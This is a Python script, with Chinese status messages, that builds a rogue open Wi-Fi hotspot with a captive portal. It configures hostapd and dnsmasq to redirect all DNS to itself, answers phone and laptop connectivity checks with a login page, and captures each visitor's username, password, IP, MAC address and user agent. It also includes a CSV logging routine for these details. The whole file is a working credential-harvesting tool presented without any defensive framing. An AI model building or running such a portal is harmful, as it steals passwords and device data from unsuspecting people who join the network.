import os
import subprocess
import datetime
import csv
from flask import Flask, request, send_file, send_from_directory
from colorama import Fore, Style, init

init()

app = Flask(__name__)

HOST_IP = "10.0.0.1"
WIFI_NAME = "测试Wifi"
INTERFACE = "wlan0"

LOGFILE = "portal_log.csv"


def run(cmd):
    os.system(cmd)


def setup_network():

    print(Fore.YELLOW + "配置热点网络..." + Style.RESET_ALL)
    print(Fore.YELLOW + "停止冲突服务..." + Style.RESET_ALL)

    run("killall hostapd")
    run("killall dnsmasq")

    run(f"ifconfig {INTERFACE} {HOST_IP} netmask 255.255.255.0")


    hostapd_conf = f"""
interface={INTERFACE}
driver=nl80211
ssid={WIFI_NAME}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

    open("hostapd.conf","w").write(hostapd_conf)

    dns_conf = f"""
interface={INTERFACE}
dhcp-range=10.0.0.100,10.0.0.200,12h
address=/#/{HOST_IP}
"""

    open("dnsmasq.conf","w").write(dns_conf)

    print(Fore.YELLOW + "配置完成." + Style.RESET_ALL)


def start_services():

    print(Fore.YELLOW + "启动服务..." + Style.RESET_ALL)

    subprocess.Popen("hostapd hostapd.conf", shell=True)

    print(Fore.YELLOW + "配置 DHCP / DNS..." + Style.RESET_ALL)

    subprocess.Popen("dnsmasq -C dnsmasq.conf -d", shell=True)


def get_mac(ip):

    try:
        out = subprocess.check_output(f"arp -n {ip}", shell=True).decode()
        return out.split()[2]
    except:
        return "unknown"


def get_os(ua):

    if "Android" in ua:
        return "Android"

    if "iPhone" in ua or "iPad" in ua:
        return "iOS"

    if "Windows" in ua:
        return "Windows"

    if "Mac OS" in ua:
        return "MacOS"

    if "Linux" in ua:
        return "Linux"

    return "Unknown"

def write_log(data):

    file_exists = os.path.isfile(LOGFILE)

    with open(LOGFILE, "a", newline="", encoding="utf-8") as f:

        writer = csv.writer(f)

        if not file_exists:
            writer.writerow([
                "time",
                "ip",
                "mac",
                "user_agent",
                "username",
                "password"
            ])

        writer.writerow(data)

@app.route('/generate_204')
@app.route('/hotspot-detect.html')
@app.route('/connecttest.txt')
def captive():
    return index()

@app.route("/")
def index():

    return send_file("index.html")
    
@app.route('/assets/<path:filename>')
def index_files(filename):
    return send_from_directory('assets', filename)


@app.route("/login", methods=["POST"])
def login():

    data = request.get_json()

    user = data.get("username")
    password = data.get("password")

    ip = request.remote_addr
    ua = request.headers.get("User-Agent")

    mac = get_mac(ip)

    now = datetime.datetime.now()

    print("USER:", user)
    print("PASS:", password)
    print("IP:", ip)

    return "ok"


if __name__ == "__main__":

    setup_network()

    start_services()

    print(Fore.GREEN + "\n启动成功！" + Style.RESET_ALL)
    print(Fore.GREEN + f"SSID: {WIFI_NAME}\n" + Style.RESET_ALL)

    app.run(host="0.0.0.0", port=80)

